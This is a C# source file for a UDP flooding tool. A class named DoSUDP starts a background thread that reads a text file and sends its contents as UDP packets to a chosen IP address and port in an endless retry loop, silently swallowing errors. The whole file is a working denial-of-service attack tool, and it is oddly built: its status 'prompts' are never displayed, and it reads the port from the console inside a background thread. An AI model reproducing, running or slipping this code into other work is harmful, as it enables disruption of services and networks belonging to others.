using System;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Threading;

namespace PM4P
{
    class DoSUDP
    {
        private string pathfile;
        private string IP;
        private int port;
        private string dt;

        public void getparam(string pf, string ip, int ports, string datatext)
        {
            pathfile = pf;
            IP = ip;
            port = ports;
            dt = datatext;
        }

        public string runfunction()
        {
            Thread obj = new Thread(threadattack);
            obj.IsBackground = true;
            obj.Start();
            return dt;
        }

        private void threadattack(Object obj)
        {
            try
            {
                dosudp(pathfile, IP, port, dt);
            }
            catch
            {

            }
        }

        private void dosudp(string path_file, string IP, int port, string datatext)
        {
            string text;
            int count = 0;

            line1:
            //path of file with message you want to send
            dt += "Type the path to your .txt file: ";
            dt += "Initializing";

            try //trying read data from file to the end of it
            {
                using (StreamReader sr = new StreamReader(path_file))
                {
                    text = sr.ReadToEnd();  //
                }
            }
            catch(FileNotFoundException ex)
            {
                dt += "The given path is typed wrong or your file doesn't exist!";
                goto line1;
            }
            
            dt += "Systems and services are starting...";

            dt += "IP: ";
            dt += "Initializing...";

            dt += "Port: ";
            port = Convert.ToInt32(Console.ReadLine());
            
            dt += "Process running...";

            //convertion for byte type from string 
            byte[] packetData = System.Text.ASCIIEncoding.ASCII.GetBytes(text);

            //object of IP address and port where you'll send the message
            IPEndPoint ep = new IPEndPoint(IPAddress.Parse(IP), port);

            /*making socket with kind of addresses of network, socket type is a socket type i don't know how to explain, 
             * and a type of protocol which we'll use to send data, in that case we use UDP protocol
             */
            Socket client = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp);

            /*if something went wrong then program going to line2: and trying once again sending packetData which have some 
             * information from us and a basic information about IP Adress and port number from object ep which is created from IPEndPoint Class
             */
            line2:
            try
            {
                client.SendTo(packetData, ep);
                count++;

                dt += "Information has been send!";

                goto line2;
            }
            catch (SystemException ex)
            {
                dt += "Oops! Something went wrong.";

                goto line1;
            }
        }
    }
}
